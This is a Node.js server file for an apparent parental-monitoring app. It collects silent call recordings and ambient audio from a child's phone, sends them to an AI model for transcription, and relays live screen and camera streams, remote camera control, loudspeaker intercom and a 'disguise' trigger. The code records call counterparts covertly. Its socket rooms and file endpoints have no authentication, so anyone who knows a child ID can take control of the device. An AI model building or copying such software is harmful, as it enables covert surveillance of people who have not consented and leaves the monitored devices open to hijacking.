require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);

// 60 FPS Ultra-low Latency Socket.IO configuration
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
  },
  pingInterval: 10000,
  pingTimeout: 5000,
  transports: ['websocket', 'polling'],
});

const PORT = process.env.PORT || 4000;
const UPLOADS_DIR = path.join(__dirname, 'uploads', 'recordings');

// Ensure recordings folder exists
if (!fs.existsSync(UPLOADS_DIR)) {
  fs.mkdirSync(UPLOADS_DIR, { recursive: true });
}

// Security & Middleware
app.use(helmet({ crossOriginResourcePolicy: false }));
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(morgan('dev'));

// Configure Multer for Lossless Call Audio Storage
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, UPLOADS_DIR);
  },
  filename: (req, file, cb) => {
    // Preserve original filename or format with timestamp
    const safeName = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
    cb(null, `${Date.now()}_${safeName}`);
  },
});

const upload = multer({
  storage,
  limits: { fileSize: 100 * 1024 * 1024 }, // Up to 100MB per audio call
});

// --- REST API ENDPOINTS ---

const { diarizeAndTranscribeAudio } = require('./geminiAudioService');

// In-Memory Storage Vault tracking recordings and AI transcripts
// This preserves lightweight transcripts (2 KB) permanently even when raw audio (50 MB) is purged!
const recordingVault = new Map();
let totalBytesPurgedFromCloud = 0;

// 1. Healthcheck
app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    service: 'Vyra Ultra HD 60FPS Signaling & Audio Vault',
    geminiEngine: {
      model: process.env.GEMINI_MODEL || 'gemini-3.8-flash',
      autoPurgeEnabled: process.env.AUTO_PURGE_ENABLED === 'true',
      savedStorageMb: (totalBytesPurgedFromCloud / (1024 * 1024)).toFixed(2),
    },
    timestamp: new Date().toISOString(),
    webrtc: {
      targetFps: 60,
      audioSampleRate: '48000Hz (Opus Studio)',
      stunServer: 'stun:stun.l.google.com:19302',
    },
  });
});

// 2. Upload Vivo Silent Call Recording / Ambient Audio Soundbite
app.post(['/api/recordings/upload', '/api/calls/upload'], upload.any(), async (req, res) => {
  try {
    const uploadedFile = req.file || (req.files && req.files.length > 0 ? req.files[0] : null);
    if (!uploadedFile) {
      return res.status(400).json({ error: 'No audio recording file uploaded' });
    }

    const fileUrl = `/api/recordings/${uploadedFile.filename}`;
    const childId = req.body.childId || 'child_1';
    const childName = req.body.childName || 'Aryan';
    const phoneNumber = req.body.phoneNumber || 'Ambient Soundbite';
    const durationSeconds = parseInt(req.body.durationSeconds || '0', 10);
    const audioFilePath = uploadedFile.path;
    const originalSize = uploadedFile.size;

    console.log(`[Audio Vault] Saved Recording: ${uploadedFile.filename} (${originalSize} bytes) for ${phoneNumber}`);

    // Create entry in vault
    const recordEntry = {
      filename: uploadedFile.filename,
      childId,
      childName,
      phoneNumber,
      durationSeconds,
      originalSize,
      fileUrl,
      isPurgedFromCloud: false,
      timestamp: new Date().toISOString(),
      diarizationStatus: 'PROCESSING',
      intelligence: null,
    };
    recordingVault.set(uploadedFile.filename, recordEntry);

    // Immediate response to child phone so it doesn't wait or drain battery
    res.json({
      success: true,
      message: 'Audio received by Cloud Vault. AI Diarization running asynchronously.',
      file: {
        filename: uploadedFile.filename,
        size: originalSize,
        url: fileUrl,
      },
    });

    // Run Gemini 3.8 Flash Multimodal Diarization in Background (Zero Child Battery Impact)
    (async () => {
      try {
        console.log(`[AI Worker] Starting Gemini 3.8 Flash Diarization on ${uploadedFile.filename}...`);
        const intelligence = await diarizeAndTranscribeAudio(audioFilePath, childName);
        
        recordEntry.diarizationStatus = 'COMPLETED';
        recordEntry.intelligence = intelligence;

        console.log(`[AI Worker] Diarization ready. Emitting to parent room room_${childId}`);
        io.to(`room_${childId}`).emit('ambient_voice_diarized', {
          filename: req.file.filename,
          childId,
          phoneNumber,
          durationSeconds,
          isPurgedFromCloud: recordEntry.isPurgedFromCloud,
          intelligence,
        });

        // Auto-purge heavy file if configured to maintain 0 MB cloud footprint
        if (process.env.AUTO_PURGE_ENABLED === 'true') {
          console.log(`[Storage Auto-Purge] Auto-clearing raw audio ${req.file.filename} to free cloud storage...`);
          if (fs.existsSync(audioFilePath)) {
            fs.unlinkSync(audioFilePath);
            recordEntry.isPurgedFromCloud = true;
            totalBytesPurgedFromCloud += originalSize;
            console.log(`[Storage Auto-Purge] Purged successfully. Total freed: ${(totalBytesPurgedFromCloud / 1024).toFixed(1)} KB. Transcript preserved.`);
          }
        }
      } catch (aiErr) {
        console.error('[AI Worker Error]', aiErr);
        recordEntry.diarizationStatus = 'FAILED';
      }
    })();

  } catch (error) {
    console.error('[Audio Vault Error]', error);
    res.status(500).json({ error: 'Failed to process audio recording' });
  }
});

// 3. Auto-Purge Endpoint (Purge Heavy Raw Audio From Cloud to Free Storage)
app.post('/api/recordings/:filename/purge', (req, res) => {
  const { filename } = req.params;
  const filePath = path.join(UPLOADS_DIR, filename);
  const entry = recordingVault.get(filename);

  let freedBytes = 0;
  if (fs.existsSync(filePath)) {
    const stat = fs.statSync(filePath);
    freedBytes = stat.size;
    fs.unlinkSync(filePath);
    totalBytesPurgedFromCloud += freedBytes;
    console.log(`[Storage Purge] Manually purged ${filename} (${freedBytes} bytes freed)`);
  }

  if (entry) {
    entry.isPurgedFromCloud = true;
  }

  res.json({
    success: true,
    message: 'Raw audio purged from cloud storage. Diarized script and speaker profiles preserved.',
    purgedBytes: freedBytes,
    totalPurgedMb: (totalBytesPurgedFromCloud / (1024 * 1024)).toFixed(2),
  });
});

// 4. Cloud Storage Stats Endpoint
app.get('/api/storage/stats', (req, res) => {
  let activeDiskBytes = 0;
  let activeFilesCount = 0;

  if (fs.existsSync(UPLOADS_DIR)) {
    const files = fs.readdirSync(UPLOADS_DIR);
    activeFilesCount = files.length;
    files.forEach(f => {
      try {
        const s = fs.statSync(path.join(UPLOADS_DIR, f));
        activeDiskBytes += s.size;
      } catch (e) {}
    });
  }

  res.json({
    activeFilesCount,
    activeDiskMb: (activeDiskBytes / (1024 * 1024)).toFixed(2),
    totalPurgedMb: (totalBytesPurgedFromCloud / (1024 * 1024)).toFixed(2),
    autoPurgePolicy: 'Aggressive: Delete raw media upon AI diarization, retain lightweight JSON transcripts (2 KB)',
  });
});

// 5. Stream Call Audio (Supports HTTP 206 Range for Seekable Playback)
app.get('/api/recordings/:filename', (req, res) => {
  const filePath = path.join(UPLOADS_DIR, req.params.filename);
  const entry = recordingVault.get(req.params.filename);

  if (!fs.existsSync(filePath)) {
    if (entry && entry.isPurgedFromCloud) {
      return res.status(200).json({
        purged: true,
        message: 'Raw audio was purged from cloud storage to save disk space. Dialogue script and speaker intelligence are preserved.',
        intelligence: entry.intelligence,
      });
    }
    return res.status(404).json({ error: 'Audio recording not found' });
  }

  const stat = fs.statSync(filePath);
  const fileSize = stat.size;
  const range = req.headers.range;

  if (range) {
    const parts = range.replace(/bytes=/, '').split('-');
    const start = parseInt(parts[0], 10);
    const end = parts[1] ? parseInt(parts[1], 10) : fileSize - 1;
    const chunksize = end - start + 1;
    const file = fs.createReadStream(filePath, { start, end });
    const head = {
      'Content-Range': `bytes ${start}-${end}/${fileSize}`,
      'Accept-Ranges': 'bytes',
      'Content-Length': chunksize,
      'Content-Type': 'audio/mp4',
    };
    res.writeHead(206, head);
    file.pipe(res);
  } else {
    const head = {
      'Content-Length': fileSize,
      'Content-Type': 'audio/mp4',
      'Accept-Ranges': 'bytes',
    };
    res.writeHead(200, head);
    fs.createReadStream(filePath).pipe(res);
  }
});

// --- WEBRTC 60 FPS SIGNALING & HIGH-FIDELITY INTERCOM ---

io.on('connection', (socket) => {
  console.log(`[Socket] Connected: ${socket.id}`);

  // Join designated child room
  socket.on('join_room', (data) => {
    const { role, childId } = data; // role: 'parent' or 'child'
    const roomName = `room_${childId || 'child_1'}`;
    socket.join(roomName);
    socket.data = { role, childId, roomName };

    console.log(`[Socket] ${role.toUpperCase()} joined ${roomName} (${socket.id})`);

    // Notify peers in room
    socket.to(roomName).emit('peer_joined', {
      role,
      socketId: socket.id,
      timestamp: Date.now(),
    });
  });

  // 1. WebRTC SDP Offer (60 FPS Stream Initiation)
  socket.on('webrtc_offer', (data) => {
    const roomName = socket.data?.roomName || `room_${data.childId || 'child_1'}`;
    console.log(`[WebRTC] Forwarding SDP Offer (60 FPS) in ${roomName}`);
    socket.to(roomName).emit('webrtc_offer', {
      sdp: data.sdp,
      senderRole: socket.data?.role,
      streamType: data.streamType, // 'SCREEN_60FPS' or 'CAMERA_1080P'
    });
  });

  // 2. WebRTC SDP Answer
  socket.on('webrtc_answer', (data) => {
    const roomName = socket.data?.roomName || `room_${data.childId || 'child_1'}`;
    console.log(`[WebRTC] Forwarding SDP Answer in ${roomName}`);
    socket.to(roomName).emit('webrtc_answer', {
      sdp: data.sdp,
      senderRole: socket.data?.role,
    });
  });

  // 3. ICE Candidate Exchange
  socket.on('ice_candidate', (data) => {
    const roomName = socket.data?.roomName || `room_${data.childId || 'child_1'}`;
    socket.to(roomName).emit('ice_candidate', {
      candidate: data.candidate,
      senderRole: socket.data?.role,
    });
  });

  // 4. Remote Camera & Flashlight Hardware Controls
  socket.on('control_camera', (data) => {
    const roomName = socket.data?.roomName || `room_${data.childId || 'child_1'}`;
    console.log(`[Camera Control] ${JSON.stringify(data)} -> ${roomName}`);
    // Command child device to switch lens (front/back) or toggle flashlight
    socket.to(roomName).emit('control_camera', data);
  });

  // 5. Live Parent Voice Intercom Blast (Studio 48kHz Opus Relay)
  socket.on('voice_intercom_stream', (data) => {
    const roomName = socket.data?.roomName || `room_${data.childId || 'child_1'}`;
    // Broadcast live audio chunks to child device loudspeaker
    socket.to(roomName).emit('voice_intercom_blast', {
      audioChunk: data.audioChunk,
      sampleRate: data.sampleRate || 48000,
      isFinal: data.isFinal || false,
    });
  });

  // 6. Remote Phone Lock / Disguise Trigger
  socket.on('remote_command', (data) => {
    const roomName = socket.data?.roomName || `room_${data.childId || 'child_1'}`;
    console.log(`[Remote Command] ${data.action} -> ${roomName}`);
    socket.to(roomName).emit('execute_command', data);
  });

  socket.on('disconnect', () => {
    if (socket.data?.roomName) {
      socket.to(socket.data.roomName).emit('peer_disconnected', {
        socketId: socket.id,
        role: socket.data.role,
      });
    }
    console.log(`[Socket] Disconnected: ${socket.id}`);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`====================================================`);
  console.log(`🚀 Vyra Ultra HD 60 FPS Signaling & Audio Hub Active`);
  console.log(`📡 Listening on Port: ${PORT}`);
  console.log(`🔊 Audio Codec: Studio Opus 48,000 Hz / Lossless M4A`);
  console.log(`🎥 Video Engine: 1080p FHD @ 60 FPS WebRTC Hardware`);
  console.log(`====================================================`);
});
